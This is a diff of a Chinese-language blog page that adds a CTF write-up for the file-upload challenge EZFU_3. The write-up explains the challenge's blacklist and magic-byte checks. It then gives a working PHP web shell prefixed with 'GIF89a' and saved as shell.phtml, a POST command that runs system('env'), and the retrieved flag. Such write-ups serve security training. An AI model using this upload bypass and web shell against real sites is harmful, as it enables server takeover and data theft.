@@ -446,7 +446,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 6 分钟
+                    阅读时长: 8 分钟
                 </time>
             </div>
         
@@ -463,7 +463,7 @@
 
 
 
-                <span class="article-time--wordcount">2981 字</span>
+                <span class="article-time--wordcount">3554 字</span>
             </div>
         
     </footer>
@@ -1139,7 +1139,45 @@ env 或 printenv 才能看见。</p>
 <p>一个是扩展名黑名单不完整。.phtml 是 PHP 的合法扩展名，出题人的黑名单里漏掉了。做文件上传题要对各种web 语言的冷门扩展名心里有数，比如 .phtml、.pht、.phps、.phar 这些，黑名单很容易漏。<br>
 另一个是 flag 的藏法。Docker 容器里经常通过环境变量注入 flag，不是文件，用 find 搜不到。养成习惯进容器先 env 看一眼。</p>
 <h3 id="ezfu_3">EZFU_3
-</h3><h3 id="ezfu_4">EZFU_4
+</h3><p>访问首页，是一个文件上传表单，只能上传图片</p>
+<p>先上传一个 PHP 文件测试，返回 <code>File type not allowed</code>，说明存在扩展名黑名单。再上传一个 <code>.phtml</code> 文件，这次返回 <code>File header validation failed</code>，说明除了扩展名黑名单之外，后端还会校验文件头（Magic Bytes）</p>
+<p>看一下源码确认过滤逻辑：</p>
+<p><strong>扩展名黑名单</strong>：php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd</p>
+<p><strong>MIME 白名单</strong>：image/jpeg、image/png、image/gif、application/pdf、application/zip</p>
+<p><strong>文件头校验</strong>：检查前 8 字节是否为 JPEG（<code>ffd8ff</code>）、PNG（<code>89504e470d0a1a0a</code>）、GIF（<code>GIF89a</code> / <code>GIF87a</code>）</p>
+<p><code>.phtml</code> 不在黑名单里，但文件头校验拦住了。突破口就是给 PHP 文件加上合法的图片文件头，骗过校验。构造 payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89a
+</span></span><span class="line"><span class="cl">&lt;?php eval($_POST[&#34;cmd&#34;]); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>保存为 <code>shell.phtml</code>，上传时 MIME 改为 <code>image/gif</code>，成功绕过两层检测</p>
+<p>上传成功后访问返回的文件路径，用 POST 发送命令执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cmd=system(&#39;env&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出中包含：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FLAG=flag{d88193df-d1e2-479a-9612-7b7b78907947}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功获得 flag</p>
+<p><strong>复盘</strong>：这题比 EZFU_2 多了一层文件头校验。<code>.phtml</code> 扩展名不在黑名单中，但裸 PHP 代码过不了文件头检查。加上 <code>GIF89a</code> 前缀后，文件头检测认为是合法 GIF 图片，而 Apache 仍然会把 <code>.phtml</code> 当 PHP 解析执行。flag 依然藏在 Docker 环境变量里，用 <code>env</code> 或 <code>printenv</code> 读取</p>
+<h3 id="ezfu_4">EZFU_4
 </h3><h3 id="ezfu_5">EZFU_5
 </h3><h3 id="ezfu_6">EZFU_6
 </h3><h3 id="ezfu_7">EZFU_7
